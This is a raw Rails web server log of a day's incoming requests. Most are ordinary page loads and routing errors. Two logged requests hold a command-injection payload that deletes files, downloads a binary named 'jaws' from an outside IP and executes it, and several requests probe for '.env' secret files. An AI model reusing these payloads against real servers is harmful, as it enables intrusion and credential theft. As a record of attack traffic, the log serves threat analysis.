I, [2023-01-22T17:50:40.910961 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T17:50:40.911135 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-22T17:56:28.835805 #1791621]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws" for 125.228.72.130 at 2023-01-22 17:56:28 +0900
I, [2023-01-22T17:56:28.836472 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T17:56:28.836519 #1791621]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 137.175.17.190/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-01-22T17:56:28.836961 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T17:56:28.837581 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T17:56:28.837749 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-01-22T18:00:04.077008 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-22 18:00:04 +0900
I, [2023-01-22T18:00:04.077665 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T18:00:04.077710 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T18:00:04.078156 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T18:00:04.080004 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.9ms | Allocations: 299)
I, [2023-01-22T18:00:04.080242 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 2.2ms | Allocations: 521)
I, [2023-01-22T18:00:04.714581 #1791621]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-22 18:00:04 +0900
F, [2023-01-22T18:00:04.714955 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T18:17:59.283354 #1791621]  INFO -- : Started GET "/verify.txt" for 198.98.52.214 at 2023-01-22 18:17:59 +0900
I, [2023-01-22T18:17:59.283944 #1791621]  INFO -- : Processing by UserController#index as TEXT
I, [2023-01-22T18:17:59.283984 #1791621]  INFO -- :   Parameters: {"all"=>"verify"}
I, [2023-01-22T18:17:59.286421 #1791621]  INFO -- : Completed 406 Not Acceptable in 2ms (Allocations: 840)
F, [2023-01-22T18:17:59.289479 #1791621] FATAL -- :   
ActionController::UnknownFormat (UserController#index is missing a template for this request format and variant.

request.formats: ["text/plain"]
request.variant: []):
  
actionpack (6.1.4.4) lib/action_controller/metal/implicit_render.rb:42:in `default_render'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `block in send_action'
<internal:kernel>:90:in `tap'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `send_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:228:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rendering.rb:30:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:42:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:117:in `block in run_callbacks'
actiontext (6.1.4.4) lib/action_text/rendering.rb:20:in `with_renderer'
actiontext (6.1.4.4) lib/action_text/engine.rb:59:in `block (4 levels) in <class:Engine>'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `instance_exec'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `block in run_callbacks'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
rack (2.2.3) lib/rack/etag.rb:27:in `call'
rack (2.2.3) lib/rack/conditional_get.rb:27:in `call'
rack (2.2.3) lib/rack/head.rb:12:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
railties (6.1.4.4) lib/rails/rack/logger.rb:28:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
rack (2.2.3) lib/rack/method_override.rb:24:in `call'
rack (2.2.3) lib/rack/runtime.rb:22:in `call'
activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:113:in `call'
railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
puma (5.6.5) lib/puma/configuration.rb:252:in `call'
puma (5.6.5) lib/puma/request.rb:77:in `block in handle_request'
puma (5.6.5) lib/puma/thread_pool.rb:340:in `with_force_shutdown'
puma (5.6.5) lib/puma/request.rb:76:in `handle_request'
puma (5.6.5) lib/puma/server.rb:443:in `process_client'
puma (5.6.5) lib/puma/thread_pool.rb:147:in `block in spawn_thread'
I, [2023-01-22T18:35:33.975552 #1791621]  INFO -- : Started GET "/" for 132.255.212.39 at 2023-01-22 18:35:33 +0900
I, [2023-01-22T18:35:33.976147 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T18:35:33.976563 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T18:35:33.977271 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T18:35:33.977436 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-01-22T18:43:18.694178 #1791621]  INFO -- : Started POST "/" for 135.125.246.110 at 2023-01-22 18:43:18 +0900
F, [2023-01-22T18:43:18.694539 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T18:43:19.233930 #1791623]  INFO -- : Started GET "/.env" for 135.125.246.110 at 2023-01-22 18:43:19 +0900
I, [2023-01-22T18:43:19.234570 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T18:43:19.234616 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T18:43:19.235057 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T18:43:19.235870 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-22T18:43:19.236080 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-22T18:46:03.716805 #1791623]  INFO -- : Started GET "/" for 36.71.81.228 at 2023-01-22 18:46:03 +0900
I, [2023-01-22T18:46:03.717713 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T18:46:03.718248 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T18:46:03.720033 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.8ms | Allocations: 299)
I, [2023-01-22T18:46:03.720246 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 2.1ms | Allocations: 513)
I, [2023-01-22T19:29:36.963551 #1791623]  INFO -- : Started GET "/" for 41.39.34.107 at 2023-01-22 19:29:36 +0900
I, [2023-01-22T19:29:36.964130 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T19:29:36.964687 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T19:29:36.965541 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 298)
I, [2023-01-22T19:29:36.965711 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 512)
I, [2023-01-22T20:55:41.011959 #1791623]  INFO -- : Started GET "/" for 143.110.212.225 at 2023-01-22 20:55:41 +0900
I, [2023-01-22T20:55:41.013272 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T20:55:41.013985 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T20:55:41.015210 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.2ms | Allocations: 299)
I, [2023-01-22T20:55:41.015558 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 521)
I, [2023-01-22T21:00:01.212177 #1791621]  INFO -- : Started POST "/" for 135.125.246.110 at 2023-01-22 21:00:01 +0900
F, [2023-01-22T21:00:01.212583 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T21:00:01.754095 #1791621]  INFO -- : Started GET "/.env" for 135.125.246.110 at 2023-01-22 21:00:01 +0900
I, [2023-01-22T21:00:01.754962 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T21:00:01.755015 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T21:00:01.755580 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T21:00:01.756319 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-22T21:00:01.756512 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-22T21:00:28.476417 #1791623]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-22 21:00:28 +0900
I, [2023-01-22T21:00:28.477049 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T21:00:28.477091 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T21:00:28.477695 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T21:00:28.478334 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T21:00:28.478580 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-22T21:00:29.239806 #1791621]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-22 21:00:29 +0900
F, [2023-01-22T21:00:29.240255 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T21:34:24.573225 #1791621]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.173.181 at 2023-01-22 21:34:24 +0900
I, [2023-01-22T21:34:24.574127 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T21:34:24.574178 #1791621]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-01-22T21:34:24.574635 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T21:34:24.576531 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.9ms | Allocations: 299)
I, [2023-01-22T21:34:24.576689 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 2.2ms | Allocations: 505)
I, [2023-01-22T21:39:30.377528 #1791621]  INFO -- : Started POST "/" for 135.125.246.110 at 2023-01-22 21:39:30 +0900
F, [2023-01-22T21:39:30.377878 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T21:39:30.920063 #1791621]  INFO -- : Started GET "/.env" for 135.125.246.110 at 2023-01-22 21:39:30 +0900
I, [2023-01-22T21:39:30.920669 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T21:39:30.920709 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T21:39:30.921498 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T21:39:30.922892 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.4ms | Allocations: 299)
I, [2023-01-22T21:39:30.923095 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 521)
I, [2023-01-22T21:39:56.700015 #1791621]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws" for 59.127.21.73 at 2023-01-22 21:39:56 +0900
I, [2023-01-22T21:39:56.700687 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T21:39:56.700736 #1791621]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 137.175.17.190/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-01-22T21:39:56.701365 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T21:39:56.702001 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T21:39:56.702344 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 514)
I, [2023-01-22T22:39:33.619953 #1791621]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-01-22 22:39:33 +0900
I, [2023-01-22T22:39:33.620685 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T22:39:33.620731 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T22:39:33.621239 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T22:39:33.621865 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T22:39:33.622314 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-22T22:39:34.199833 #1791621]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-01-22 22:39:34 +0900
F, [2023-01-22T22:39:34.200181 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T23:10:46.217325 #1791621]  INFO -- : Started GET "/" for 5.235.186.195 at 2023-01-22 23:10:46 +0900
I, [2023-01-22T23:10:46.217958 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-22T23:10:46.218542 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T23:10:46.219181 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T23:10:46.219573 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 513)
I, [2023-01-22T23:41:41.455120 #1791621]  INFO -- : Started POST "/" for 135.125.246.110 at 2023-01-22 23:41:41 +0900
F, [2023-01-22T23:41:41.455471 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-22T23:41:41.990522 #1791621]  INFO -- : Started GET "/.env" for 135.125.246.110 at 2023-01-22 23:41:41 +0900
I, [2023-01-22T23:41:41.991329 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T23:41:41.991390 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T23:41:41.991994 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T23:41:41.992831 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-22T23:41:41.993049 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-01-22T23:45:13.502547 #1791623]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-22 23:45:13 +0900
I, [2023-01-22T23:45:13.503229 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-22T23:45:13.503272 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-22T23:45:13.503793 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-22T23:45:13.504421 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-22T23:45:13.504598 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 522)
I, [2023-01-22T23:45:14.171623 #1791621]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-22 23:45:14 +0900
F, [2023-01-22T23:45:14.171961 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
